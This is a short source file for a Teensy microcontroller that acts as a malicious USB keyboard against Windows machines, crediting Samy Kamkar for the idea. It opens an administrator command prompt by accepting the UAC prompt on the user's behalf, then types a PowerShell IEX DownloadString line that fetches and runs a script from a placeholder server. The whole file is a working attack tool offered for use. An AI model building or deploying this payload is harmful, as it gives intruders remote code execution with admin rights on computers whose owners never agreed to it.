/* USBx (Opening Admin Shell), by Stratos Kordonis(skordonis)
    for Teensy 3.1/3.2
    code made to work with Windows Machines.
    Credidts to Samy Kamkar for the ispiration
*/
void setup() {
  
  Keyboard.begin();
  delay(500);

  type(KEY_LEFT_ALT, false);
  type(KEY_F4, false);
  Keyboard.releaseAll();
  delay(500);

  type(KEY_ESC, false);
  Keyboard.releaseAll();
  delay(500);

  type(KEY_LEFT_GUI, false);
  Keyboard.releaseAll();
  delay(500);

  print(F("cmd"));
  Keyboard.releaseAll();
  delay(500);

  type(KEY_LEFT_CTRL, false);
  type(KEY_LEFT_SHIFT, false);
  type(KEY_RETURN, false);
  Keyboard.releaseAll();
  delay(500);

  type(KEY_LEFT, false);
  type(KEY_RETURN, false);
  Keyboard.releaseAll();
  delay(500);

  print(F("powershell IEX (New-Object Net.WebClient).DownloadString('http://SERVERWHEREPS1ISHOSTED/powershell.ps1')"));
  type(KEY_RETURN, false);
  Keyboard.releaseAll();
  delay(500);


  //type(KEY_RETURN, false);
  Keyboard.releaseAll();
  Keyboard.end();


}
void type(int key, boolean release) {
  Keyboard.press(key);
  if (release)
    Keyboard.release(key);
}
void print(const __FlashStringHelper *value) {
  Keyboard.print(value);
}
void loop() {}


